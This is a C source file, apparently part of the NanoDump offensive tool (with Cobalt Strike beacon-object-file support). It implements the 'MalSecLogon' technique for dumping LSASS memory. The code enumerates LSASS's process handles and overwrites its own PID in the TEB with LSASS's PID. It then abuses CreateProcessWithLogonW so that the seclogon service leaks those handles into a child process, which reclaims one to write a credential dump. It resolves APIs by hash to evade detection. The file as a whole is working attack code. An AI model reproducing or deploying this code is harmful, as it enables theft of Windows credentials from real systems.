#include "../include/malseclogon.h"

PHANDLE_LIST find_process_handles_in_lsass(
    DWORD lsass_pid
)
{
    BOOL success;

    PHANDLE_LIST handle_list = intAlloc(sizeof(HANDLE_LIST));
    if (!handle_list)
    {
        malloc_failed();
        return NULL;
    }

    ULONG ProcesTypeIndex = 0;
    success = GetTypeIndexByName(&ProcesTypeIndex);
    if (!success)
    {
        intFree(handle_list); handle_list = NULL;
        return NULL;
    }

    PSYSTEM_HANDLE_INFORMATION handleTableInformation = get_all_handles();
    if (!handleTableInformation)
    {
        intFree(handle_list); handle_list = NULL;
        return NULL;
    }

    // loop over each handle
    for (ULONG j = 0; j < handleTableInformation->Count; j++)
    {
        PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];

        // make sure this handle is from LSASS
        if (handleInfo->UniqueProcessId != lsass_pid)
            continue;

        // make sure the handle has the permissions we need
        if ((handleInfo->GrantedAccess & (LSASS_PERMISSIONS)) != (LSASS_PERMISSIONS))
            continue;

        // make sure the handle is of type 'Process'
        if (handleInfo->ObjectTypeIndex != ProcesTypeIndex)
            continue;

        if (handle_list->Count + 1 > MAX_HANDLES)
        {
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Too many handles, please increase MAX_HANDLES\n"
            );
            intFree(handleTableInformation); handleTableInformation = NULL;
            intFree(handle_list); handle_list = NULL;
            return NULL;
        }
        handle_list->Handle[handle_list->Count++] = (HANDLE)(ULONG_PTR)handleInfo->HandleValue;
    }

    intFree(handleTableInformation); handleTableInformation = NULL;
    return handle_list;
}

void change_pid(DWORD new_pid, PDWORD previous_pid)
{
    if (previous_pid)
        *previous_pid = (DWORD)READ_MEMLOC(CID_OFFSET);
    PDWORD pPid = (PDWORD)&(((struct TEB*)NtCurrentTeb())->ClientId);
    // the memory region where the TEB is should be RW
    *pPid = new_pid;
}

void set_command_line(
    LPWSTR command_line,
    LPCSTR program_name,
    LPCSTR dump_name,
    BOOL fork,
    BOOL valid
)
{
    // program path
    wchar_t program_name_w[MAX_PATH];
    mbstowcs(program_name_w, program_name, MAX_PATH);
    wcscpy(command_line, L"\"");
    wcsncat(command_line, program_name_w, MAX_PATH);
    wcsncat(command_line, L"\"", MAX_PATH);
    // dump path
    wchar_t dump_name_w[MAX_PATH];
    mbstowcs(dump_name_w, dump_name, MAX_PATH);
    wcsncat(command_line, L" -w ", MAX_PATH);
    wcsncat(command_line, dump_name_w, MAX_PATH);
    // --fork
    if (fork)
        wcsncat(command_line, L" -f", MAX_PATH);
    // valid
    if (valid)
        wcsncat(command_line, L" -v", MAX_PATH);
    // seclogon
    wcsncat(command_line, L" --seclogon", MAX_PATH);
    // --stage 2
    wcsncat(command_line, L" --stage2", MAX_PATH);
}

BOOL seclogon_stage_1(
    LPCSTR program_name,
    LPCSTR dump_name,
    BOOL fork,
    BOOL valid,
    BOOL dup,
    DWORD lsass_pid
)
{
    BOOL success;
    PHANDLE_LIST handle_list;

    // if the file already exists, delete it
    if (file_exists(dump_name))
    {
        if (!delete_file(dump_name))
        {
            return FALSE;
        }
    }

    wchar_t command_line[MAX_PATH];
    set_command_line(
        command_line,
        program_name,
        dump_name,
        fork,
        valid
    );

    handle_list = find_process_handles_in_lsass(
        lsass_pid
    );
    if (!handle_list)
        return FALSE;

    if (handle_list->Count == 0)
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "No process handles found in LSASS, is the PID %ld correct?.\n",
            lsass_pid
        );
        intFree(handle_list); handle_list = NULL;
        return FALSE;
    }

    // change our PID to the LSASS PID
    DWORD original_pid;
    change_pid(lsass_pid, &original_pid);

    PROCESS_INFORMATION procInfo;
    STARTUPINFOW startInfo;
    wchar_t filename[MAX_PATH];
    mbstowcs(filename, program_name, MAX_PATH);

    // find the address of CreateProcessWithLogonW dynamically
    CREATEPROCESSWITHLOGONW pCreateProcessWithLogonW;
    pCreateProcessWithLogonW = (CREATEPROCESSWITHLOGONW)GetFunctionAddress(
        GetLibraryAddress(ADVAPI32),
        CreateProcessWithLogonW_SW2_HASH
    );
    if (!pCreateProcessWithLogonW)
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Address of 'CreateProcessWithLogonW' not found\n"
        );
#endif
        return FALSE;
    }

    DWORD handles_leaked = 0;
    while (handles_leaked < handle_list->Count)
    {
        memset(&procInfo, 0, sizeof(PROCESS_INFORMATION));
        memset(&startInfo, 0, sizeof(STARTUPINFOW));
        startInfo.dwFlags = STARTF_USESTDHANDLES;

        startInfo.hStdInput = handle_list->Handle[handles_leaked++];

        if (handle_list->Count > handles_leaked)
            startInfo.hStdOutput = handle_list->Handle[handles_leaked++];

        if (handle_list->Count > handles_leaked)
            startInfo.hStdError = handle_list->Handle[handles_leaked++];

        success = pCreateProcessWithLogonW(
            L"NanoDumpUser",
            L"NanoDumpDomain",
            L"NanoDumpPwd",
            LOGON_NETCREDENTIALS_ONLY,
            filename,
            command_line,
            0,
            NULL,
            NULL,
            &startInfo,
            &procInfo
        );
        if (!success)
        {
            function_failed("CreateProcessWithLogonW");
            change_pid(original_pid, NULL);
            intFree(handle_list); handle_list = NULL;
            return FALSE;
        }
        if (dup)
        {
            /*
             * --seclogon was used together with --dup
             * once the process was created,
             * return and duplicate the handle
             */
            // sleep 5 seconds to let LSASS process the new (fake) credentials
            Sleep(5000);
            // TODO: check that the 3 handles we leaked are actually valid
            return TRUE;
        }
        // we cannot call WaitForSingleObject on the returned handle in startInfo because the handles are duped into lsass process, we need a new handle
        HANDLE hSpoofedProcess = get_process_handle(
            procInfo.dwProcessId,
            SYNCHRONIZE,
            FALSE
        );
        if (!hSpoofedProcess)
        {
            change_pid(original_pid, NULL);
            intFree(handle_list); handle_list = NULL;
            return FALSE;
        }
        success = wait_for_process(hSpoofedProcess);
        if (!success)
        {
            change_pid(original_pid, NULL);
            intFree(handle_list); handle_list = NULL;
            return FALSE;
        }
        NtClose(hSpoofedProcess); hSpoofedProcess = NULL;
        if (file_exists(dump_name))
        {
            change_pid(original_pid, NULL);
            intFree(handle_list); handle_list = NULL;
            return TRUE;
        }
    }
    // restore the original PID
    change_pid(original_pid, NULL);
    intFree(handle_list); handle_list = NULL;
    return FALSE;
}

#ifndef BOF
HANDLE seclogon_stage_2(
    LPCSTR dump_path
)
{
    // if the file already exists, exit
    if (file_exists(dump_path))
        return NULL;

    for (DWORD leakedHandle = 4; leakedHandle <= 4 * 6; leakedHandle = leakedHandle + 4)
    {
        if (!is_lsass((HANDLE)(ULONG_PTR)leakedHandle))
        {
            NtClose((HANDLE)(ULONG_PTR)leakedHandle);
            continue;
        }
        return (HANDLE)(ULONG_PTR)leakedHandle;
    }
    return NULL;
}
#endif
